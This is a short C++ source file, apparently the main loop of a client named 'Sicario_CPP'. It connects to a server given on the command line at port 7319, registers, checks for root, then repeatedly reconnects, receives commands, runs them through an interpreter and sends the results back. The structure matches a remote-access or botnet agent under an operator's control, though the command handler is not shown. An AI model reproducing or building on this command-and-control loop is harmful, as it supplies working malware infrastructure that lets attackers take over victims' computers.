#include <iostream>
#include <string>
#include <stdlib.h>
#include <stdio.h>

#ifdef __unix__
    #include <unistd.h>
#endif

#include "sicarioClient.h"
#include "errors.h"

void catchError(unsigned short error) {
    if(errorList[error].critical == true) {
        std::cerr << errorList[error].text;
        exit(error);
    } else {
        std::cerr << errorList[error].text;
    }
}

// Warning: Platform-specific!
void sleepFor(unsigned long long seconds) {
    sleep(seconds);
}

const std::string msg_copyright = "// Sicario_CPP // 2018 // Made by Erusima and Dante383 //\n\n";

int main(int argc, char** argv) {
    std::cout << isRoot();
    std::cout << msg_copyright;
    SicarioClient client(argv[1], 7319);
    client.registerUser();
    client.disconnect();
    while(true) {
        sleepFor(client.connInterval);
        try {
            client.reconnect();
            client.loginUser(client.userKey);
            std::string data = "";
            do {
                data = client.receiveData();
                std::string result = client.interpretCommand(data);
                client.sendData(result);
            } while(data != "");
            client.disconnect();
        } catch(unsigned short error) {
            catchError(error);
        }
    }
}

